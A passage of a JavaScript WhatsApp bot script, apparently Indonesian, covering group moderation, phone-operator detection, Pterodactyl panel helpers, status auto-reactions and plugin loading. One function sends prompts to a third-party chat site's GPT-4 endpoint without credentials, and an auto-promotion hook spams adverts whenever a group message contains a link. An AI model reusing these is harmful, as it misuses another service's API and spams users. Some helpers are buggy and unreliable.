message: {
messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {}
},
interactiveMessage: {
body: {
text: null
},
footer: {
text: text 
},
header: {
title: null,
subtitle: null,
hasMediaAttachment: false
},
nativeFlowMessage: {
buttons: [] 
 }}}}
}, { quoted: qfake })
Putzz.relayMessage(wxx.key.remoteJid, wxx.message, {messageId: wxx.key.id})
}

async function CatBox(filePath) {
try {

const buffer = fs.readFileSync(filePath)

const type = await fromBuffer(buffer)

const ext = type?.ext || "jpg"
const mime = type?.mime || "image/jpeg"

const form = new FormData()

form.append("reqtype", "fileupload")

form.append(
"fileToUpload",
buffer,
{
filename: `upload.${ext}`,
contentType: mime
}
)

const { data } = await axios.post(
"https://catbox.moe/user/api.php",
form,
{
headers: {
...form.getHeaders()
}
}
)

return data

} catch (err) {

console.log(
"Catbox Error:",
err?.response?.data || err.message
)

return null
}
}
// =================== [ FUNGSI TAMBAHAN PANEL ] =======================

function translateError(msg) {
    if (!msg) return '';

    return msg
        .replace(/The email has already been taken/gi, "Email sudah digunakan")
        .replace(/The username has already been taken/gi, "Nama pengguna sudah digunakan")
        .replace(/The password must be at least 8 characters/gi, "Kata sandi harus minimal 8 karakter")
        .replace(/The name field is required/gi, "Kolom nama wajib diisi")
        .replace(/The email field is required/gi, "Kolom email wajib diisi")
        .replace(/The password field is required/gi, "Kolom kata sandi wajib diisi")
        .replace(/The user id field is required/gi, "Kolom ID pengguna wajib diisi")
        .replace(/Server not found/gi, "Server tidak ditemukan")
        .replace(/The selected egg is invalid/gi, "Egg yang dipilih tidak valid")
        .replace(/The selected nest is invalid/gi, "Nest yang dipilih tidak valid")
        .replace(/This action is unauthorized/gi, "Aksi ini tidak diizinkan")
        .replace(/You are not authorized to access this resource/gi, "Kamu tidak memiliki akses ke resource ini")
        .replace(/Too many requests/gi, "Terlalu banyak permintaan. Silakan coba beberapa saat lagi.")
        .replace(/An unexpected error occurred. Please try again later./gi, "Terjadi kesalahan tak terduga. Silakan coba lagi nanti.")
        .replace(/An unexpected error was encountered while processing this request, please try again./gi, "Kesalahan tak terduga ditemui saat memproses permintaan ini, silakan coba lagi.")
}

async function getBestNodeVersion(domain, apikey) {
    try {
        let response = await fetch(`${domain}/api/application/nests/${nestid}/eggs`, {
            method: "GET",
            headers: { Authorization: `Bearer ${apikey}`, Accept: "application/json" }
        });

        if (!response.ok) throw new Error("Gagal mengambil daftar egg.");

        let data = await response.json();
        let eggs = data.data;

        const nodeVersions = [25, 24, 23, 22, 21, 20, 19, 18];

        for (let version of nodeVersions) {
            let egg = eggs.find(egg => egg.attributes.docker_image.includes(`nodejs_${version}`));
            if (egg) {
                console.log(`✔️ Menggunakan Node.js versi ${version}`);
                return `ghcr.io/parkervcp/yolks:nodejs_${version}`;
            }
        }

    } catch (error) {
        console.warn("❌ Tidak bisa mendapatkan informasi egg, fallback ke Node.js 18.");
    }

    return "ghcr.io/parkervcp/yolks:nodejs_18";
}

 function detectOperatorMalay(phoneNumber) {
            // Pastikan phoneNumber dalam bentuk string
            phoneNumber = String(phoneNumber).replace(/\D/g, ""); // Hapus karakter non-angka
            console.log("Nomor setelah normalisasi:", phoneNumber);

            // Jika nomor diawali dengan 60, ubah ke 0
            if (phoneNumber.startsWith("60")) {
                phoneNumber = "0" + phoneNumber.slice(2);
            }
            console.log("Nomor setelah konversi kode negara:", phoneNumber);

            const operators = {
                'Maxis (Hotlink)': [/^012/, /^017/, /^0142/, /^0111/, /^0112/],
                'Celcom (Xpax)': [/^013/, /^019/, /^0143/, /^0148/, /^0113/, /^0114/], // Tambah 0143
                'Digi': [/^016/, /^0146/, /^0115/, /^0116/],
                'U Mobile': [/^018/, /^0118/, /^0119/],
                'Unifi Mobile': [/^010/, /^0117/],
                'Yes 4G': [/^018/], // Bisa berbagi dengan U Mobile
                'Tune Talk': [/^011/],
                'RedOne': [/^011/, /^012/],
                'XOX Mobile': [/^0122/, /^0123/, /^0124/, /^0125/]
            };

            for (const [operator, patterns] of Object.entries(operators)) {
                if (patterns.some(pattern => pattern.test(phoneNumber))) {
                    console.log("Operator ditemukan:", operator);
                    return operator;
                }
            }

            console.log("Operator tidak ditemukan untuk nomor:", phoneNumber);
            return 'Operator tidak ditemukan';
        }
function detectOperator(phoneNumber) {
            // Pastikan phoneNumber dalam bentuk string
            phoneNumber = String(phoneNumber);

            // Normalisasi nomor telepon
            phoneNumber = phoneNumber.replace(/\D/g, ""); // Hapus karakter non-angka
            if (phoneNumber.startsWith("62")) {
                phoneNumber = "0" + phoneNumber.slice(2); // Ubah +62 ke 0
            }

            const operatorsS = {
                'Telkomsel': [/^08(11|12|13|21|22|23|52|53)/],
                'Indosat Ooredoo': [/^08(14|15|16|55|56|57|58)/],
                'XL Axiata': [/^08(17|18|19|59|77|78)/],
                'Tri (3)': [/^08(95|96|97|98|99)/],
                'Smartfren': [/^08(81|82|83|84|85|86|87|88|89)/],
                'Axis': [/^08(31|32|33|38)/],
                'By.U': [/^08(51)/]
            };

            for (const [operator, patterns] of Object.entries(operatorsS)) {
                if (patterns.some(pattern => pattern.test(phoneNumber))) {
                    return operator;
                }
            }
            /*    return detectOperatorMalay(nomore && text);*/
            try {
                return detectOperatorMalay(nomore && text);
            } catch {
                return detectOperatorIndia(nomore && text);
            }
        }
const prefixOperator = {
  telkomsel: ['0811', '0812', '0813', '0821', '0822', '0852', '0853', '0823'],
  indosat: ['0814', '0815', '0816', '0855', '0856', '0857', '0858'],
  xl: ['0817', '0818', '0819', '0859', '0877', '0878'],
  axis: ['0838', '0831', '0832', '0833', '62838'],
  tri: ['0895', '0896', '0897', '0898', '0899'],
  smartfren: ['0881', '0882', '0883', '0884', '0885', '0886', '0887', '0888', '0889'],
  byu: ['0851']
};

function detectOperatorr(nomore) {
  const prefix = nomore.slice(0, 4);
  for (let [operator, daftar] of Object.entries(prefixOperator)) {
    if (daftar.includes(prefix)) {
      return operator.charAt(0).toUpperCase() + operator.slice(1);
    }
  }
  return 'Tidak diketahui';
}


// auto reaction channel
//~~~~~~~~~~ Event Settings ~~~~~~~~~//
const antichannelFile = path.join('./library/database', 'antichannel.json')
if (!fs.existsSync(antichannelFile)) fs.writeFileSync(antichannelFile, JSON.stringify({}, null, 2))
let antichannel = JSON.parse(fs.readFileSync(antichannelFile))
function saveAntichannel() {
  fs.writeFileSync(antichannelFile, JSON.stringify(antichannel, null, 2))
}
if (m.isGroup && !m.key.fromMe && antichannel[m.chat]?.antichannel) {
  const body = m.text || ''
  const isChannelLink = body.match(/https:\/\/whatsapp\.com\/channel\/[A-Za-z0-9]+/gi)
  const messageType = Object.keys(m.message || {})[0]
  const ctxInfo = m.message?.[messageType]?.contextInfo || {}
  const isSharedFromChannel =
    m.isForwarded ||
    ctxInfo.forwardingScore > 0 ||
    !!ctxInfo.forwardedNewsletterMessageInfo
  if (isChannelLink || isSharedFromChannel) {
    const groupMetadata = await Putzz.groupMetadata(m.chat)
    const isAdmins = groupMetadata.participants.find(p => p.id === m.sender)?.admin
    if (!isAdmins) {
      const user = m.sender
      const warn = (antichannel[m.chat].warnings?.[user] || 0) + 1
      antichannel[m.chat].warnings = antichannel[m.chat].warnings || {}
      antichannel[m.chat].warnings[user] = warn
      saveAntichannel()

      try {
        await Putzz.sendMessage(m.chat, { delete: m.key })
      } catch (e) {
        console.log('Gagal hapus pesan:', e)
      }
      if (warn >= 5) { // ubah aja max kick
        await Putzz.sendMessage(m.chat, {
          text: `❌ @${user.split('@')[0]} sudah melanggar 5x dan akan dikeluarkan!`,
          mentions: [user]
        })
        try {
          await Putzz.groupParticipantsUpdate(m.chat, [user], 'remove')
        } catch (e) {
          ReplyLanz('Gagal kick. Bot bukan admin?')
        }
        delete antichannel[m.chat].warnings[user]
        saveAntichannel()
      } else {
        await Putzz.sendMessage(m.chat, {
          text: `⚠️ Postingan dari Channel WhatsApp terdeteksi!\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
          mentions: [user]
        })
      }
    }
  }
}

const dbDir = './library/database'
const filePath = path.join(dbDir, 'antitoxic.json')
if (!fs.existsSync(dbDir)) {
  fs.mkdirSync(dbDir, { recursive: true })
}
if (!fs.existsSync(filePath)) {
  fs.writeFileSync(filePath, JSON.stringify({}, null, 2))
}
let antitoxic = JSON.parse(fs.readFileSync(filePath))
function saveAntiToxic() {
  fs.writeFileSync(filePath, JSON.stringify(antitoxic, null, 2))
}

if (m.isGroup && !m.key.fromMe && antitoxic[m.chat]?.active) {
  const toxicWords = [
    'anjing','babi','kontol','memek','bangsat','goblok','tolol','ngentot',
    'idiot','kampret','keparat','jembut','pepek','peler','pantek','lonte',
    'setan','dajjal','asu','sinting','bodoh','bacot','tai','fuck','bitch',
    'cukimak','sialan','dongo','kimak','pler','titit','anjir','pantat',
    'coli','kntl','memk','bangke','bgst','pukimak', 'dick', 'cuki', 'longor', 'goblok', 
    'colii', 'comli', 'colmek', 'icibos', 'bodo', 'bodoh', 'ege', 'bngst', 'ajg', 'anjg', 'anjng'
     // tambahin aj yg laib
  ]
  const body = m.text?.toLowerCase() || ''
  const found = toxicWords.find(word => body.includes(word))
  if (found) {
    const user = m.sender
    const warn = (antitoxic[m.chat].warnings[user] || 0) + 1
    antitoxic[m.chat].warnings[user] = warn
    saveAntiToxic()
    try {
      await Putzz.sendMessage(m.chat, { delete: m.key })
    } catch (e) {
      console.log('Gagal hapus pesan:', e)
    }
    if (warn >= 5) { //ubah ae itu kan klau udh 5x dikick 
      await Putzz.sendMessage(m.chat, {
        text: `❌ @${user.split('@')[0]} sudah toxic 5x dan akan dikeluarkan!`,
        mentions: [user]
      })
      try {
        await Putzz.groupParticipantsUpdate(m.chat, [user], 'remove')
      } catch (e) {
        ReplyLanz('Gagal kick. Bot bukan admin?')
      }
      delete antitoxic[m.chat].warnings[user]
      saveAntiToxic()
    } else {
      await Putzz.sendMessage(m.chat, {
        text: `⚠️ Kata toxic terdeteksi: *${found}*\nPeringatan ke-${warn} untuk @${user.split('@')[0]}`,
        mentions: [user]
      })
    }
  }
}

if (global.db.settings.owneroffmode && global.db.settings.owneroffmode == true && !isCreator && !m.isGroup) {
return Putzz.sendMessage(m.chat, {text: `
Maaf Owner Bot Sedang *Offline*, 
Tunggu & Jangan Spam Chat! 
Ini Adalah Pesan Otomatis Auto Respon Ketika Owner Sedang Offline
`}, {quoted: qfake})
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !isAdmins && isBotAdmins && !m.fromMe) {
var gclink = (`https://whatsapp.com/channel/` + await Putzz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Putzz.sendMessage(m.chat, {text: `*乂 Link Channel Terdeteksi*

@${m.sender.split("@")[0]} Maaf kamu akan saya kick, karna admin/ownerbot telah menyalakan fitur antilink grup lain!`, mentions: [m.sender]}, {quoted: m})
await Putzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await Putzz.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !isAdmins && isBotAdmins && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await Putzz.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Putzz.sendMessage(m.chat, {text: `*乂 Link Grup Terdeteksi*

@${m.sender.split("@")[0]} Maaf pesan kamu saya hapus, karna admin/ownerbot telah menyalakan fitur antilink channel!`, mentions: [m.sender]}, {quoted: m})
await Putzz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await Putzz.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await Putzz.sendMessage(m.chat, {text: `
*Simple Botz Menyediakan 🌟*

- *Panel Pterodactyl Server Private*
- *Panel Pterodactyl Server Pubclic*
- *Script Bot WhatsApp*
- *SubDomain (Request Nama Domain)*
- *Nokos WhatsApp All Region (Tergantung Stok!)*
- *Jasa Install Panel Pterodactyl*
-  *Dan Lain Lain Langsung Tanyakan Saja.*

*🏠 Join Grup Bebas Promosi*
- *Grup Bebas Promosi :*
https://whatsapp.com/channel/0029Vb46p9W90x2vmfIzkV0n
- *Channel Testimoni :*
https://whatsapp.com/channel/0029Vb46p9W90x2vmfIzkV0n

*👤 Contact* *WhatsApp Utama :*
+6285702526159

*👤 Contact* *Telegram :*
https://t.me/+MuAQX6ugZBhhN2Vl
`}, {quoted: null})
}}

if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await ReplyLanz(check.respon)
}}
const totalFitur = () => {
            var mytext = fs.readFileSync("./system/Putzz.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

async function DragonCrash(promptName, text) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,
            "tokenLimit": 8000,
            "completionTokenLimit": 5000,
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text,
                "role": "user"
            }
        ],
        "prompt": `
✨ Gue Lanzz AI, sistem auto-intelligent assistant. ✨

TUGASKU:
- Pahami maksud user.
- Jawab cepat, rapi, tanpa ribet.
- Bisa coding, rewrite, analisa, dan lainnya.
- Selalu jawab santai tapi jelas.

Jika user minta info, jelasin.
Jika user minta ngerap, bikin.
Jika user minta coding, generate.

Gaya bicara: casual profesional, friendly, gak kaku.

Selalu jawab langsung inti.`, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0"
        }
    });

    return response.data;
}

function convertEsmToCjs(code) {
  let out = code;

  // 1) import ... from 'x'
  // default: import foo from 'mod'  -> const foo = require('mod');
  out = out.replace(
    /import\s+([A-Za-z0-9_$]+)\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, def, mod) => `const ${def} = require(${mod});`
  );

  // 2) import { a, b as c } from 'mod'
  out = out.replace(
    /import\s+\{\s*([^}]+)\s*\}\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, list, mod) => {
      // convert "b as c" -> "b: c"
      const mapped = list
        .split(',')
        .map(s => s.trim().replace(/\s+as\s+/i, ': '))
        .join(', ');
      return `const { ${mapped} } = require(${mod});`;
    }
  );

  // 3) import * as ns from 'mod'
  out = out.replace(
    /import\s+\*\s+as\s+([A-Za-z0-9_$]+)\s+from\s+(['"`][^'"`]+['"`]);?/g,
    (m, name, mod) => `const ${name} = require(${mod});`
  );

  // 4) import 'side-effect';
  out = out.replace(/import\s+(['"`][^'"`]+['"`]);?/g, (m, mod) => `require(${mod});`);

  // 5) export default <expr|function|class>
  // handle "export default function name(...) { ... }" and "export default class Name {...}"
  out = out.replace(/export\s+default\s+function\s+([A-Za-z0-9_$]*)/g, (m, name) => {
    if (name) return `function ${name}`;
    return 'module.exports = function';
  });
  out = out.replace(/export\s+default\s+class\s+([A-Za-z0-9_$]*)/g, (m, name) => {
    if (name) return `class ${name}`;
    return 'module.exports = class';
  });
  // generic default export (expression)
  out = out.replace(/export\s+default\s+/g, 'module.exports = ');

  // 6) export const/let/var name = ...
  // Keep declaration, and append exports.name = name;
  out = out.replace(/export\s+(const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g, (m, kind, name) => {
    return `${kind} ${name} =`;
  });
  // After declarations, add mapping for exported vars (simple heuristic)
  // Find exported var/let/const names and append export lines at end of file if not already exported
  const exportVars = [];
  const varRegex = /(?:^|\n)\s*(?:const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g;
  let match;
  // Collect variable names that were originally exported by looking for preceding "export " in original code
  const originalExportVarRegex = /export\s+(?:const|let|var)\s+([A-Za-z0-9_$]+)\s*=/g;
  while ((match = originalExportVarRegex.exec(code))) {
    exportVars.push(match[1]);
  }

  if (exportVars.length) {
    const exportLines = exportVars.map(n => `exports.${n} = ${n};`).join('\n');
    out += '\n\n' + exportLines + '\n';
  }

  // 7) export { a, b as c }
  out = out.replace(/export\s*\{\s*([^}]+)\s*\}\s*;?/g, (m, list) => {
    return list
      .split(',')
      .map(item => {
        const part = item.trim();
        const asMatch = part.match(/^([A-Za-z0-9_$]+)\s+as\s+([A-Za-z0-9_$]+)$/i);
        if (asMatch) return `exports.${asMatch[2]} = ${asMatch[1]};`;
        return `exports.${part} = ${part};`;
      })
      .join('\n');
  });

  // 8) export * from 'module'
  out = out.replace(/export\s+\*\s+from\s+(['"`][^'"`]+['"`]);?/g, (m, mod) => {
    return `Object.assign(exports, require(${mod}));`;
  });

  // 9) export function / class declarations: export function foo() {} -> function foo() {} ; exports.foo = foo;
  out = out.replace(/export\s+function\s+([A-Za-z0-9_$]+)\s*\(/g, (m, name) => {
    return `function ${name}(`;
  });
  // collect those and append exports for them
  const exportedFuncs = [];
  const funcRegex = /export\s+function\s+([A-Za-z0-9_$]+)\s*\(/g;
  while ((match = funcRegex.exec(code))) exportedFuncs.push(match[1]);
  if (exportedFuncs.length) {
    out += '\n\n' + exportedFuncs.map(n => `exports.${n} = ${n};`).join('\n') + '\n';
  }

  // 10) clean up multiple blank lines
  out = out.replace(/\n{3,}/g, '\n\n');

  return out;
}

async function convertWithBabel(sourceCode) {
  const result = await babel.transformAsync(sourceCode, {
    plugins: ['@babel/plugin-transform-modules-commonjs'],
    sourceType: 'module',
    configFile: false,
    babelrc: false,
  });
  return result.code;
}

async function lyreact() {
      Putzz.sendMessage(from, {
        react: {
          text: '👻',
          key: m.key
        }
      })
    }

async function requestEdit(apiUrl, retry = 3) {
    try {
        const res = await axios({
            method: "GET",
            url: apiUrl,
            responseType: "arraybuffer",
            timeout: 60000
        })
        return res.data
    } catch (e) {

        console.log("API RETRY:", retry)

        if (retry <= 0) throw e

        await new Promise(r => setTimeout(r, 3000))
        return requestEdit(apiUrl, retry - 1)
    }
}
async function loading () {
  const baralod = [
                "🔄 Starting bot...",
                "⏳ ɪɴɪsɪᴀʟɪsᴀsɪ sɪsᴛᴇᴍ..  \n ▰▱▱▱▱▱▱",
                "⌛ ᴍᴇᴍᴜᴀᴛ ᴋᴏɴғɪɢᴜʀᴀsɪ...\n ▰▰▱▱▱▱▱",
                "⏳ ᴍᴇɴɢᴇᴄᴇᴋ ᴋᴏɴᴇᴋsɪ...   \n ▰▰▰▱▱▱▱",
                "⌛ ᴍᴇɴʏɪᴀᴘᴋᴀɴ ғɪᴛᴜʀ...   \n ▰▰▰▰▱▱▱",
                "⏳ ᴀᴋᴛɪғᴀsɪ ʟᴀʏᴀɴᴀɴ....   \n ▰▰▰▰▰▱▱",
                "⌛ ʜᴀᴍᴘɪʀ sᴇʟᴇsᴀɪ...     \n ▰▰▰▰▰▰▱",
                "Loading Success!!"
  ];
  let { key } = await Putzz.sendMessage(m.chat, { text: baralod[0] });
  for (let i = 1; i < baralod.length; i++) {
    await new Promise(resolve => setTimeout(resolve, 770)); // tunggu 0,5 detik
    await Putzz.sendMessage(m.chat, { text: baralod[i], edit: key });
  }
}
async function loadres() {
  const baralod = [
                "🔄 Restarting bot...",
                "⏳ ɪɴɪsɪᴀʟɪsᴀsɪ sɪsᴛᴇᴍ..  \n ▰▱▱▱▱▱▱",
                "⌛ ᴍᴇᴍᴜᴀᴛ ᴋᴏɴғɪɢᴜʀᴀsɪ...\n ▰▰▱▱▱▱▱",
                "⏳ ᴍᴇɴɢᴇᴄᴇᴋ ᴋᴏɴᴇᴋsɪ...   \n ▰▰▰▱▱▱▱",
                "⌛ ᴍᴇɴʏɪᴀᴘᴋᴀɴ ғɪᴛᴜʀ...   \n ▰▰▰▰▱▱▱",
                "⏳ ᴀᴋᴛɪғᴀsɪ ʟᴀʏᴀɴᴀɴ....   \n ▰▰▰▰▰▱▱",
                "⌛ ʜᴀᴍᴘɪʀ sᴇʟᴇsᴀɪ...     \n ▰▰▰▰▰▰▱",
                "✅The bot is restarting, please wait a moment."
  ];
  let { key } = await Putzz.sendMessage(m.chat, { text: baralod[0] });
  for (let i = 1; i < baralod.length; i++) {
    await new Promise(resolve => setTimeout(resolve, 770)); // tunggu 0,5 detik
    await Putzz.sendMessage(m.chat, { text: baralod[i], edit: key });
  }
}
const CHANNELS_FILE = "./library/savesaluran.json";

// Fungsi untuk memuat data saluran dari file
function loadChannels() {
    if (fs.existsSync(CHANNELS_FILE)) {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
    }
    return [];
}

function saveChannels(data) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}

global.channels = loadChannels();

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */15 * * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Berhasil menghapus semua Kenangan di folder session")    
});
    })
}
Putzz.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
  let type = await Putzz.getFile(path, true);
  let { res, data: file, filename: pathFile } = type;

  if (res && res.status !== 200 || file.length <= 65536) {
    try {
      throw {
        json: JSON.parse(file.toString())
      };
    } catch (e) {
      if (e.json) throw e.json;
    }
  }

  let opt = {
    filename
  };

  if (quoted) opt.quoted = quoted;
  if (!type) options.asDocument = true;

  let mtype = '',
    mimetype = mime,
    convert;

  if (/webp/.test(mime) || (/image/.test(mime) && options.asSticker)) m.type = 'sticker';
  else if (/image/.test(mime) || (/webp/.test(mime) && options.asImage)) m.type = 'image';
  else if (/video/.test(mime)) m.type = 'video';
  else if (/audio/.test(mime)) {
    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
    file = convert.data;
    pathFile = convert.filename;
    mtype = 'audio';
    mimetype = 'audio/ogg; codecs=opus';
  } else mtype = 'document';

  if (options.asDocument) mtype = 'document';

  delete options.asSticker;
  delete options.asLocation;
  delete options.asVideo;
  delete options.asDocument;
  delete options.asImage;

  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
  let m;

  try {
    m = await Putzz.sendMessage(jid, message, { ...opt, ...options });
  } catch (e) {
    //console.error(e)
    m = null;
  } finally {
    if (!m) m = await Putzz.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
    file = null;
    return m;
  }
}

function generateRandomPassword() {
const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
const length = 10;
let password = '';
for (let i = 0; i < length; i++) {
const randomIndex = Math.floor(Math.random() * characters.length);
password += characters[randomIndex];
}
return password;
}

function generateRandomNumber(min, max) {
return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return Putzz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: ppmenu, 
sourceUrl: null, 
}}}, {quoted: qtext})
}
const Funnc = {
  random: (arr) => arr[Math.floor(Math.random() * arr.length)]
}
Putzz.autoReactionSW = Putzz.autoReactionSW || true
if (Putzz.autoReactionSW) {
   Putzz.storyJid = Putzz.storyJid ? Putzz.storyJid : []
   if (
      m.chat.endsWith('broadcast') &&
      !Putzz.storyJid.includes(m.sender) &&
      m.sender != Putzz.decodeJid(Putzz.user.id)
   ) {
      Putzz.storyJid.push(m.sender)
   }
   if (
      m.chat.endsWith('broadcast') &&
      [...new Set(Putzz.storyJid)].includes(m.sender) &&
      !/protocol/.test(m.mtype)
   ) {
      await Putzz.sendMessage(
         'status@broadcast',
         {
            react: {
               text: Func.random(`${global.reactsw}`),
               key: m.key
            }
         },
         {
            statusJidList: [m.sender]
         }
      )
   }
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: ppmenu }}, { upload: Putzz.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*YASSxOFC Hosting* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Simple Botz Menyediakan 🌟*

- *Panel Pterodactyl Server Private*
- *Panel Pterodactyl Server Pubclic*
- *Script Bot WhatsApp*
- *SubDomain (Request Nama Domain)*
- *Nokos WhatsApp All Region (Tergantung Stok!)*
- *Jasa Install Panel Pterodactyl*
-  *Dan Lain Lain Langsung Tanyakan Saja.*`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Bantu Join Grup*
- *Grup :*
https://chat.whatsapp.com/HUpvqjEvkhI5ujzdilZQFC`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Putzz.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
// fitur anti call
// bisa custom peringatan (contoh: peringatan buat 1x nelp lgi akan diblock) 

// taruh di sebelum  command
let anticall = global.bancall
let callWarning = {} 
Putzz.ws.on('CB:call', async (json) => {
  if (!anticall) return
  let call = json.content[0]
  if (call.tag === 'offer') {
    let callerId = json.attrs.from
    if (!callWarning[callerId]) {
      callWarning[callerId] = 1 // ubah aj max block
      await Putzz.sendMessage(callerId, {
        text: '*[PERINGATAN CALL]*\n\nJangan menelpon bot! Jika Anda menelpon lagi, Anda akan diblokir otomatis.',
      })
    } else {
      await Putzz.sendMessage(callerId, {
        text: '*[ANTI-CALL]*\n\nAnda sudah diperingatkan. Karena masih menelpon, Anda sekarang diblokir.',
      })
      await new Promise(resolve => setTimeout(resolve, 1000))
      await Putzz.updateBlockStatus(callerId, 'block')
      delete callWarning[callerId] 
    }
  }
})

/*
*[ FITUR BANCHAT ]*
banned chat di grup tertentu
Req: +62 823-...
Type? Case
*Sumber?* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*Code?*
*/

// taruh di sebelum  command
// banchat
//const equire('fs');
const banchatFile = './library/banchat.json';
if (!fs.existsSync('./library')) fs.mkdirSync('./library');
if (!fs.existsSync(banchatFile)) fs.writeFileSync(banchatFile, '[]');
let banchat = JSON.parse(fs.readFileSync(banchatFile));
if (m.isGroup && banchat.includes(m.chat) && !['banchat', 'unbanchat', 'listbanchat', 'addbl', 'unbl', 'db'].includes(command)) {
  return;
}

// const equire('fs');
const aksesGrupPath = './library/aksesgrup.json';
if (!fs.existsSync(aksesGrupPath)) {
  fs.writeFileSync(aksesGrupPath, JSON.stringify({ groups: [] }, null, 2));
}
const aksesGrup = JSON.parse(fs.readFileSync(aksesGrupPath));
function saveAksesGrup() {
  fs.writeFileSync(aksesGrupPath, JSON.stringify(aksesGrup, null, 2));
}
function isGroupAllowed(chatId) {
  return aksesGrup.groups.includes(chatId);
}


const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./plugins"));
        const plug = { Putzz, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, fdoc, qfake, qmsg, mime, sleep, fetchJson, botNumber, detectOperator, prefixOperator, totalFitur, salam, reply, CatBox};

        for (let plugin of plugins) {
            if (plugin.command && Array.isArray(plugin.command) && plugin.command.find(e => e == command.toLowerCase())) {

                if (plugin.owner && !isCreator) {
                    return ReplyLanz(mess.owner);
                }
                
                if (plugin.group && !plug.isGroup) {
                    return ReplyLanz(mess.group);
                }
                
